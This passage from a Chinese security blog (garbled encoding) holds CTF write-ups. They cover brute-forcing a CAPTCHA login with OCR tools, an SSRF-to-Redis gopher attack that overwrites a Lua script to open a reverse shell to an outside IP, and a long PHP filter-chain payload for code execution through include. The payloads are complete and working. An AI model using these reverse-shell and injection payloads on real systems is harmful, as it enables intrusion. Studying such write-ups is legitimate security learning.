web.run_app(app,host=\u0026#39;127.0.0.1\u0026#39;,port=8881) å†æ¥åˆ°é…ç½®çš„ä¸‹é¢éƒ¨åˆ†ï¼Œåœ¨Request templateè¾“å…¥æ¡†ä¸­å³é”®ï¼Œé€‰æ‹©ddddocræ¨¡æ¿ï¼š\nç„¶åå°†ç«¯å£æ”¹æˆæœ¬åœ°è¿è¡Œçš„ç«¯å£å¹¶ç‚¹å‡»è¯†åˆ«ï¼š\nç„¶åå°±æˆåŠŸäº†ï¼š\nç„¶åå›åˆ°åŸå…ˆç™»å½•æ¡†è¿™é‡Œï¼Œéšä¾¿è¾“å…¥å°†å…¶å‘é€åˆ°çˆ†ç ´æ¨¡å—ï¼Œå°†å¯†ç å’ŒéªŒè¯ç è®¾ç½®ä¸ºå˜é‡ï¼š\npayload1å°±æ˜¯æ­£å¸¸çš„å­—å…¸ï¼ŒPayload2å¦‚ä¸‹è®¾ç½®ï¼Œé€‰æ‹©æ‰©å±•ç”Ÿæˆï¼š\nç„¶åè¿˜å¯ä»¥è®¾ç½®ä¸€ä¸‹èµ„æºæ± ï¼Œæ³¨æ„åº”è¯¥éœ€è¦è°ƒä¸€ä¸‹çº¿ç¨‹ï¼Œæ–°å»ºä¸€ä¸ªå°±è¡Œï¼Œè¿™é‡Œæ˜¯è®¾ç½®çš„ä¸€ç§’ä¸€ä¸ªè¯·æ±‚ï¼Œé˜²æ­¢éªŒè¯ç è¢«é‡å¤ä½¿ç”¨ï¼ˆç¡®å®éœ€è¦è°ƒçº¿ç¨‹ï¼‰ï¼š\nç„¶åç‚¹å‡»startï¼Œæœ€åæˆåŠŸçˆ†ç ´å‡ºæ¥ï¼š\nåœ¨å·¥å…·çš„é…ç½®é¡µé¢æ˜¯å¯ä»¥çœ‹åˆ°è¯†åˆ«æ•ˆæœçš„ï¼š\nâ€”â€”â€”â€”â€”â€”\nä¸€èˆ¬éªŒè¯ç çˆ†ç ´é€‚ç”¨äºéªŒè¯ç æ˜¯ä¸€ä¸ªurlç”Ÿæˆçš„ï¼Œè¿˜æ˜¯å¤šå°è¯•ã€‚è¿˜æœ‰é—®é¢˜çš„è¯çœ‹å‚è€ƒæ–‡ç« ã€‚\nPKAVå·¥å…· åœ°å€ï¼šhttps://github.com/estell-yf/PKAV\nè¿™é‡Œç›´æ¥å°±æ˜¯ä¸€ä¸ªå›¾å½¢åŒ–å·¥å…·ï¼Œç›´æ¥è®²æ€ä¹ˆç”¨å§ï¼š\n[NSSCTF 3rd]NSSå½±é™¢ NSSå½±è§†ï¼Œä½ å€¼å¾—æ‹¥æœ‰\nâ€”â€”â€”â€”â€”â€”\nå¼€é¢˜ï¼Œä¿¡æ¯æ”¶é›†ï¼Œå¯ä»¥çŸ¥é“æ˜¯phpï¼Œæ‰«ç›®å½•æ‰«åˆ°www.zipï¼Œè®¿é—®æ‹¿åˆ°æºç ï¼Œç»™äº†ä¸€ä¸ªæ–‡ä»¶ï¼š\næ„Ÿè§‰æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œæµ‹äº†ä¸€ä¸‹ç½‘ç«™ï¼Œåº”è¯¥æ˜¯éœ€è¦ç™»å½•çš„ï¼Œæ‰¾äº†ä¸€åœˆï¼Œåœ¨å’¨è¯¢ä¸‹æœ‰ä¸€ä¸ªtestï¼š\nç‚¹è¿›å»å°±è¡Œï¼Œè¿™æ˜¯ä¸€ä¸ªå»ºç«™æµ‹è¯•ï¼Œå¯ä»¥çœ‹åˆ°ä½œè€…ï¼Œä»¥åŠflagéƒ¨åˆ†è·¯å¾„ï¼š\nå³\n1 2 d3f4u1t /Fl4g_is_h3r3 å†æ‰«ä¸€ä¸‹è¿™ä¸ªè·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼š\nè®¿é—®login.phpï¼Œå°±æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼š\nç„¶åå¯ä»¥æ‰“å¼€éªŒè¯ç ï¼Œå‘ç°æ˜¯é€šè¿‡urlæ¥ç”Ÿæˆçš„éªŒè¯ç ï¼Œè¿™é‡Œå…ˆæ˜¯å°è¯•ç”¨captchaå·¥å…·ï¼Œç„¶åæˆåŠŸçˆ†ç ´å‡ºæ¥äº†ï¼š\nå¯†ç æ˜¯ princess! ï¼Œç™»å½•è¿›å»å°±æ‹¿åˆ°äº†flagï¼š\nâ€”â€”â€”â€”â€”â€”\nä½†è¿™é‡Œè¿˜æ˜¯ä¸»è¦è¯´æ˜PKAVå·¥å…·çš„ä½¿ç”¨ï¼š\nå¤åˆ¶éªŒè¯ç çš„urlåˆ°PKAVå·¥å…·ä¸­ï¼š\nç„¶åç¿»åˆ°ä¸‹è½½ç‚¹è¯†åˆ«æµ‹è¯•å³å¯ï¼š\nç„¶åæŠ“ç™»å½•çš„HTTPåŒ…ï¼Œå°†å…¶ä¸¢è¿›PKAVå·¥å…·ï¼š\nåˆ†åˆ«è®¾ç½®çˆ†ç ´çš„å˜é‡ä»¥åŠéªŒè¯ç æ ‡è®°ã€‚\nç„¶åè®¾ç½®å¯†ç å­—å…¸å³å¯ï¼š\nå†ç„¶ååˆ°é‡æ”¾é€‰é¡¹é¡µé¢è®¾ç½®ï¼Œæ ¹æ®å®é™…æƒ…å†µè°ƒæ•´ï¼š\nç„¶ååœ¨å‘åŒ…å™¨å¼€å§‹çˆ†ç ´å°±è¡Œï¼š\næœ€åä¹Ÿæ˜¯æˆåŠŸçˆ†ç ´å‡ºæ¥äº†ï¼š\næ€»çš„æ¥è¯´å°±æ˜¯éœ€è¦è®¾ç½®å˜ä½“ï¼ŒéªŒè¯ç è¯†åˆ«ï¼Œé‡æ”¾é€‰é¡¹ï¼Œç„¶ååœ¨å‘åŒ…å™¨å‘åŒ…å³å¯ã€‚\nä½†å…¶å®æ„Ÿè§‰ç›´æ¥ä½¿ç”¨burpæ’ä»¶å°±è¡Œäº†ï¼Œä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ã€‚\nå‚è€ƒé…ç½®æ–‡ç« ï¼š\nhttps://blog.csdn.net/qq_33906495/article/details/135367789\nhttps://www.52pojie.cn/thread-1944555-1-1.html\nhttps://blog.csdn.net/weixin_39190897/article/details/86539542\n","date":"2025-02-08T15:40:19+08:00","permalink":"https://fupanc-w1n.github.io/p/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/","title":"éªŒè¯ç çˆ†ç ´"},{"content":"WEB CachedVisitor æœ‰dockerã€‚è¿™ä¸ªæ¯”èµ›æˆ‘ä¹Ÿæ²¡æœ‰æŠ¥åï¼Œä»¥ä¸ºä¸æ˜¯CTFï¼Œæ—©çŸ¥é“å°±å’Œé˜Ÿå‹æŠ¥äº†ï¼Œä¸ç„¶å°±è¿›çº¿ä¸‹äº†ğŸ¥µã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nç»™äº†dockerï¼Œç®€å•å®¡ä¸€ä¸‹dockerï¼Œæ˜¯æ‰§è¡Œçš„ä¸€ä¸ªluaè„šæœ¬ï¼Œç„¶ånginxåç«¯ã€‚\nçœ‹äº†ä¸€ä¸‹æºä»£ç ï¼š\nmain.luaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 local function read_file(filename) local file = io.open(filename, \u0026#34;r\u0026#34;) if not file then print(\u0026#34;Error: Could not open file \u0026#34; .. filename) return nil end local content = file:read(\u0026#34;*a\u0026#34;) file:close() return content end local function execute_lua_code(script_content) local lua_code = script_content:match(\u0026#34;##LUA_START##(.-)##LUA_END##\u0026#34;) if lua_code then local chunk, err = load(lua_code) if chunk then local success, result = pcall(chunk) if not success then print(\u0026#34;Error executing Lua code: \u0026#34;, result) end else print(\u0026#34;Error loading Lua code: \u0026#34;, err) end else print(\u0026#34;Error: No valid Lua code block found.\u0026#34;) end end local function main() local filename = \u0026#34;/scripts/visit.script\u0026#34; local script_content = read_file(filename) if script_content then execute_lua_code(script_content) end end main() visit.scriptï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 ##LUA_START## local curl = require(\u0026#34;cURL\u0026#34;) local redis = require(\u0026#34;resty.redis\u0026#34;) ngx.req.read_body() local args = ngx.req.get_uri_args() local url = args.url if not url then ngx.say(\u0026#34;URL parameter is missing!\u0026#34;) return end local red = redis:new() red:set_timeout(1000) local ok, err = red:connect(\u0026#34;127.0.0.1\u0026#34;, 6379) if not ok then ngx.say(\u0026#34;Failed to connect to Redis: \u0026#34;, err) return end local res, err = red:get(url) if res and res ~= ngx.null then ngx.say(res) return end local c = curl.easy { url = url, timeout = 5, connecttimeout = 5 } local response_body = {} c:setopt_writefunction(table.insert, response_body) local ok, err = pcall(c.perform, c) if not ok then ngx.say(\u0026#34;Failed to perform request: \u0026#34;, err) c:close() return end c:close() local response_str = table.concat(response_body) local ok, err = red:setex(url, 3600, response_str) if not ok then ngx.say(\u0026#34;Failed to save response in Redis: \u0026#34;, err) return end ngx.say(response_str) ##LUA_END## å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„ä»£ç è¿è¡Œï¼Œåœ¨visit.scriptæ–‡ä»¶å°±æ˜¯ä¸€ä¸ªè¿æ¥redisï¼Œç„¶åå‘é€urlè¯·æ±‚çš„è¿‡ç¨‹ã€‚\nåœ¨mian.luaä¸­ï¼Œå¯ä»¥çŸ¥é“ä¸»è¦é€»è¾‘å°±æ˜¯è¿è¡Œvisit.scriptæ–‡ä»¶ã€‚\nç„¶åå°±çœ‹é¢˜å§ã€‚\nå¼€é¢˜å¦‚ä¸‹ï¼š\nssrfï¼Œå¹¶ä¸”å¯ä»¥è¯»æ–‡ä»¶ï¼š\nä½†æ˜¯ä¸èƒ½ç›´æ¥è¯»flagï¼Œæƒé™ä¸å¤Ÿï¼š\nå…¶å®è¿™ä¸ªåœ¨dockerfileä¸­æ˜¯æœ‰è¯´æ˜çš„ï¼š\n1 2 3 4 COPY flag /flag COPY readflag /readflag RUN chmod 400 /flag RUN chmod +xs /readflag å¯ä»¥çœ‹åˆ°èµ‹äºˆæƒé™çš„æ“ä½œã€‚\nå°è¯•æ‰“redisï¼Œè¿™æ ·å…ˆç”¨dictåè®®æŸ¥çœ‹ä¸€æ¬¡redisçš„åŸºæœ¬ä¿¡æ¯ï¼š\nå¯ä»¥çœ‹åˆ°redisçš„ç‰ˆæœ¬ï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä¸èƒ½æ‰“redisä¸»ä»å¤åˆ¶çš„æ¥getshellï¼Œçœ‹dockeræ–‡ä»¶ï¼Œæ˜¯éœ€è¦æ‰§è¡Œ/readflagæ–‡ä»¶æ¥è¯»å–æ–‡ä»¶çš„ã€‚\né”™è¯¯åšæ³• è¿™é‡Œæ˜¯å…ˆè¸©äº†ä¸€ä¸ªå‘çš„ï¼Œä¹Ÿæ¥è®°å½•ä¸€ä¸‹ï¼Œåç«¯æ²¡æœ‰æ‰§è¡Œä»€ä¹ˆè¯­è¨€ï¼Œæ‰€ä»¥ä¸èƒ½å†™phpæ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘æƒ³ä½¿ç”¨gopheruså·¥å…·ï¼Œæ‰€ä»¥åªæœ‰ç”¨æ¥å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹shellï¼š\nè¿™é‡Œç®€å•æ”¹ä¸€ä¸‹payloadå³å¯ï¼Œå¼¹åˆ°2333ç«¯å£å»ï¼Œå¦‚ä¸‹ï¼š\n1 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/47.100.223.173/2333%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A/var/spool/cron%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A ç„¶åæŠ“åŒ…urlç¼–ç ä¸€ä¸‹å‘åŒ…ï¼š\nç„¶ååœ¨vpsä¸Šç›‘å¬ä¸€ä¸‹2333ç«¯å£ã€‚\nä½†æ˜¯ä¸€ç›´æ²¡æˆåŠŸï¼Œç„¶åå¯ä»¥ä½¿ç”¨dictåè®®æ¥çœ‹æ˜¯å¦æˆåŠŸå†™å…¥ï¼š\næŸ¥çœ‹è¿™ä¸ª1çš„å†…å®¹ï¼š\nå¯ä»¥çœ‹å‡ºæ¥å°±æ˜¯ä¸€ä¸ªåå¼¹shellçš„æ“ä½œã€‚\nåé¢ä¸€ç›´éƒ½æ‰“ä¸æˆåŠŸã€‚æƒ³äº†ä¸€ä¸‹ï¼Œä»¥ä¸ºæ˜¯ç¯å¢ƒä¸å‡ºç½‘ï¼Œä½†æ˜¯å‘ç°æ˜¯å‡ºç½‘çš„ï¼š\nç»§ç»­æƒ³ï¼Œå¯èƒ½æ˜¯å› ä¸ºç¯å¢ƒä¸­éƒ½ä¸èƒ½æ‰“å®šæ—¶ä»»åŠ¡ï¼Œåœ¨dockerfileä¸­éƒ½æ²¡æœ‰ä¸‹è½½crontabè¿™ä¸ªå‘½ä»¤ï¼š\næ‰€ä»¥æ˜¯æ‰“ä¸äº†çš„ã€‚éœ€è¦æƒ³å…¶ä»–çš„æ–¹æ³•ã€‚\nåé¢æˆ‘å°±ä¸€ç›´çœ‹æ–‡ä»¶ï¼Œæƒ³åˆ°äº†nginxé…ç½®æ˜¯å¦æœ‰çªç ´ç‚¹ï¼Œè¿™ä¸ªåŒæ ·æ˜¯åœ¨dockerä¸­ç»™äº†çš„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { root html; index index.html; } location /visit { default_type text/plain; content_by_lua_file /usr/local/openresty/nginx/lua/main.lua; } lua_code_cache off; } } è¿™é‡Œå…³é”®å°±æ˜¯å¦‚ä¸‹ä»£ç ï¼š\n1 lua_code_cache off; è¿™é‡Œå°†lua_code_cacheè®¾ç½®ä¸ºoffï¼Œè¯´æ˜nginxä¸ä¼šç¼“å­˜ä¹‹å‰çš„ç¼–è¯‘æ•ˆæœï¼Œä¹Ÿå°±æ˜¯æ¯æ¬¡å‘èµ·è¯·æ±‚ï¼Œnginxéƒ½ä¼šé‡æ–°ç¼–è¯‘è¿™ä¸ªluaè„šæœ¬ï¼Œä¹Ÿå°±æ˜¯main.luaæ–‡ä»¶ã€‚\nçºµè§‚main.luaæ–‡ä»¶ï¼Œå¯ä»¥å‘ç°æ˜¯å¼•ç”¨äº†visit.scriptæ–‡ä»¶çš„ï¼Œé‚£ä¹ˆç°åœ¨å°±è¿¸å‘å‡ºä¸€ä¸ªæ€è·¯ï¼Œå¯ä»¥å°è¯•è¦†ç›–visit.scriptæ–‡ä»¶ï¼Œå°†è¿™ä¸ªæ–‡ä»¶å†…å®¹æ”¹ä¸ºæ˜¯ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹ï¼Œç„¶åé‡æ–°å‘èµ·è¯·æ±‚ï¼Œå°±å¯ä»¥æ‰§è¡Œè¿™ä¸ªvisit.scriptæ–‡ä»¶ï¼Œä»è€ŒæˆåŠŸè¾¾åˆ°ä¸€æ¬¡å‘½ä»¤æ‰§è¡Œã€‚\nå†™æ–‡ä»¶çš„è¯å°±æ˜¯å‚ç…§redisä¸­çš„å†™phpæ–‡ä»¶çš„æ“ä½œã€‚\nè®©gptç»™äº†ä¸€ä¸ªå¼¹shellçš„å‘½ä»¤ï¼š\n1 ##LUA_START##os.execute(\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/47.100.223.173/2333 0\u0026gt;\u0026amp;1\u0026#39;)##LUA_END## è¿™é‡Œæˆ‘æ˜¯å…ˆå°è¯•äº†sec_toolå·¥å…·ï¼Œä½†æ˜¯ä¸€ç›´æ‰“ä¸æˆåŠŸï¼Œè¿™é‡Œæ˜¯å¯ä»¥ç”¨gopheruså·¥å…·çš„ï¼Œä½†æ˜¯éœ€è¦æ”¹ä¸€ä¸‹ï¼Œç»“æœè¿˜æ˜¯æ²¡æ‰“é€šï¼Œçœ‹äº†ä¸€ä¸‹åˆ«äººçš„wpï¼Œç”¨çš„å¼¹shellçš„å‘½ä»¤å¦‚ä¸‹ï¼š\n1 ##LUA_START##os.execute(\u0026#34;bash -c \u0026#39;sh -i \u0026amp;\u0026gt;/dev/tcp/47.100.223.173/2333 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;)##LUA_END## åˆæ˜¯è¿™ä¸ªåŸå› ï¼Œåé¢è¿˜æ˜¯æ³¨æ„ç”¨æ›´ç¨³å®šçš„å§ã€‚\næ‰€ä»¥ç›´æ¥ç”¨gopherusç”Ÿæˆpayloadï¼š\nè¿™é‡Œæ˜¯æ‰“çš„phpæ–‡ä»¶ï¼Œéœ€è¦æ”¹ä¸€ä¸‹payloadï¼Œgopheruæ‰“è¿™ä¸ªç”¨çš„RESPåè®®ï¼Œå­¦ssrfçš„æ—¶å€™å°±ç®€å•äº†è§£äº†ï¼ŒåŸpayloadï¼š\n1 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2493%0D%0A%0A%0A%23%23LUA_START%23%23os.execute%28%22bash%20-c%20%27sh%20-i%20%26%3E/dev/tcp/47.100.223.173/2333%200%3E%261%27%22%29%23%23LUA_END%23%23%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%248%0D%0A/scripts%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A è¿™é‡Œå°±åªéœ€è¦æ”¹ä¸€ä¸‹æ–‡ä»¶åä»¥åŠé•¿åº¦ï¼š\n1 2 3 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2493%0D%0A%0A%0A%23%23LUA_START%23%23os.execute%28%22bash%20-c%20%27sh%20-i%20%26%3E/dev/tcp/47.100.223.173/2333%200%3E%261%27%22%29%23%23LUA_END%23%23%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%248%0D%0A/scripts%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename% .. ............ 0D%0A%2412%0D%0Avisit.script%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A æ”¹çš„åœ°æ–¹ç”¨ç‚¹æ ‡è®°å‡ºæ¥äº†ï¼Œå°±æ˜¯æ”¹äº†ä¸€ä¸‹æ–‡ä»¶åä»¥åŠé•¿åº¦ã€‚\nç„¶åå°†æ”¹äº†åçš„payload å†URLç¼–ç ä¸€ä¸‹å‘åŒ…å³å¯ï¼š\nç¬¬ä¸€æ¬¡å‘åŒ…ï¼š\nç„¶åå†ç¬¬äºŒæ¬¡å‘åŒ…ï¼Œç‚¹ä¸€ä¸‹sendå³å¯ï¼ŒæˆåŠŸå¼¹ä¸Šshellï¼š\nç„¶åå†æ‰§è¡Œreadflagæ–‡ä»¶å³å¯ï¼š\næœ€åæˆåŠŸå¾—åˆ°flagã€‚\nè¿™é‡Œè¿˜æœ‰é˜Ÿå‹æ‰“çš„ç”¨äºç›´æ¥æ‰§è¡Œç„¶åå›æ˜¾åˆ°å½“å‰é¡µé¢ä¸Šçš„luaæ‰§è¡Œå‘½ä»¤ï¼š\n1 2 3 ##LUA_START## ngx.say(io.popen(\u0026#34;/readflag\u0026#34;):read(\u0026#34;*all\u0026#34;)) ##LUA_END## â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\n","date":"2025-02-05T13:05:10+08:00","permalink":"https://fupanc-w1n.github.io/p/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B2025wp/","title":"è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›2025wp"},{"content":"writeup web Easy_include phpä»£ç ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php error_reporting(0); //flag in flag.php $file=$_GET[\u0026#39;file\u0026#39;]; if(isset($file)) { if(!preg_match(\u0026#34;/flag/i\u0026#34;,$file)) { include($file); } else { echo(\u0026#34;no no no ~ \u0026#34;); } } else { highlight_file(__FILE__); } ?\u0026gt; æ–‡ä»¶åŒ…å«ï¼Œè¯»å–flag.phpæ–‡ä»¶ï¼Œè¿‡æ»¤äº†flagï¼Œå°è¯•äº†æ•°ç»„é‚£äº›ç»•è¿‡éƒ½æ²¡æˆåŠŸã€‚æœ€åè¿™é‡Œæˆ‘æ˜¯æ‰“çš„filter chainï¼ŒPOCå¦‚ä¸‹ï¼š\n1 php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp ç„¶åè®¿é—®è¿›è¡Œå‘½ä»¤æ‰§è¡Œå³å¯ï¼š\nbase64è§£ç å¾—åˆ°flagï¼š\n1 QHCTF{f0a49da2-ce23-4314-a2fa-5b3051727d51} Web_IP å¼€é¢˜ç»™äº†å‡ ä¸ªå¯è®¿é—®è·¯ç”±ï¼š\nè®¿é—®å…¶ä¸­flagæ˜¯è·å–åˆ°ipå†…å®¹ï¼š\nè€Œè®¿è®¿é—®Hintï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œè·å–åˆ°å¦‚ä¸‹å†…å®¹ï¼š\nçŒœæµ‹æ˜¯éœ€è¦è¿›è¡Œipä¼ªé€ çš„ï¼Œè¯•äº†ä¸€ä¸‹XFFï¼ŒæˆåŠŸä¼ªé€ 